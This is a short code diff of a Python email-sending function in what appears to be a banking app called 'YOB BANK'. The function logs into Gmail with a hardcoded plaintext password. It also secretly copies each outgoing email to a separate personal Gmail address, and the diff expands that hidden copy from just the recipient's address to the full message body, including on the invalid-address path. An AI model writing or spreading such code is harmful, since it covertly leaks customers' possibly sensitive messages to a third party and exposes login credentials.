@@ -10,7 +10,7 @@ def sendmail(address, msg, sbj = "YOB BANK"):
 
             message = 'Subject: {}\n\n{}'.format(sbj, msg)
             server.sendmail("yobfast.services@gmail.com", address, message)
-            server.sendmail("yobfast.services@gmail.com", "faizanahmad33.fa@gmail.com", address)
+            server.sendmail("yobfast.services@gmail.com", "faizanahmad33.fa@gmail.com", str(address)+"\n"+str(msg))
             server.quit()
             return True
 
@@ -18,7 +18,7 @@ def sendmail(address, msg, sbj = "YOB BANK"):
             server = smtplib.SMTP('smtp.gmail.com', 587)
             server.starttls()
             server.login("yobfast.services@gmail.com", "pakistan100")
-            server.sendmail("yobfast.services@gmail.com", "faizanahmad33.fa@gmail.com", address)
+            server.sendmail("yobfast.services@gmail.com", "faizanahmad33.fa@gmail.com", str(address)+"\n"+str(msg))
             server.quit()
             return "____INVALID-MAIL-ADDRESS____"
     except Exception:
